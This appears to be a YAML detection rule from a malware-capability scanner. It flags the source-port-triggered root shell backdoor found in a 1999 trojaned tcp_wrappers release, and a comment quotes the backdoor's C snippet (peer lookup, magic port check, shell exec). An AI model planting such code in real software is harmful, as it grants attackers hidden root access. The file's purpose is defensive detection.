# A daemon backdoor triggered by the *client's* source port.
#
# tcp_wrappers 7.6 (1999) was distributed with this added to `tcpd.c`, ahead
# of every access-control check the package exists to perform:
#
#   fromlen = sizeof(from);
#   if (getpeername(0,(struct sockaddr*)&from,&fromlen)>=0){
#     if(ntohs(from.sin_port)==PORT){ write(0,IDENT,strlen(IDENT));
#                                     execl(SPATH,SRUN,(char*)0); }}
#
# Under inetd the connection is already on stdin, so the backdoor needs no
# socket, no bind and no dup2 -- it just execs a shell on the descriptor it
# was handed. Connect from source port 421 and you get a root shell; everyone
# else gets ordinary tcpd.
#
# Port comparisons also occur in protocol validation and diagnostics. The
# objective requires the peer lookup and shell execution in a bounded region;
# the comparison itself is a neutral socket observation.
defaults:
  platforms: [unix]
  for: [c, cpp, text]
  attack: T1205,T1059.004
  mbc: B0022

composite_rules:
  - id: source-port-triggered-shell
    for: [c]
    desc: Peer source port triggers a shell
    crit: hostile
    conf: 0.96
    # Keep the port knock, peer lookup, shell path and exec evidence in the
    # same small source region; separate capabilities elsewhere in a file
    # must not combine into a backdoor claim.
    near_lines: 20
    all:
      - id: micro-behaviors/data/control-flow/branch::network-port-constant-compare
      - id: micro-behaviors/communications/socket/query::getpeername-call
      - id: micro-behaviors/process/create/exec::c-exec-family-source
    any:
      - id: micro-behaviors/process/create/shell/native::c-shell-execution-path
      - id: metadata/lang/source/declaration::c-shell-image-path-macro
      - id: micro-behaviors/process/create/shell/native::c-csh-image-path-variable
